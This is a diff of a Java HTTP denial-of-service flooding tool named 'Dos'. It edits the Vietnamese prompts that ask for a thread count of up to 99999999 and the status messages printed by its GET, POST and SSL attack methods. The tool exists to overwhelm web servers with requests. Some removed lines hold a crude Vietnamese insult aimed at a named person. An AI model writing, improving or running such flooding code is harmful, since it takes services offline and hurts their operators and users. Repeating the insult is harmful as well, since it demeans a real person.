@@ -80,7 +80,7 @@ public class Dos implements Runnable {
 
         System.out.println("KDuy is the best :3");
 
-        System.out.print("Thread:mặc định 17000 : ");
+        System.out.print("Thread : nhập số từ 1 - 99999999 : ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -89,7 +89,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method:mặc định/80000 : ");
+        System.out.print("method : Nhập số càng to càng tốt : ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -170,7 +170,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("POST tuấn anh đang đụ!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Nào ai đã một lần được yêu: " + responseCode + "Khánh Duy send atack " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -180,7 +180,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET tuấn anh đang đụ!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Nào ai đã một lần được yêu: " + responseCode + "Huheo " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -197,7 +197,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET  anh đang đụ!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("GET  anh đang buồn!:" + responseCode + "buồnnn  " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -207,6 +207,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET anh đang đụ!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Duysadboy =((!: " + responseCode + "nổi buồn x: " + this.seq);
     }
 }
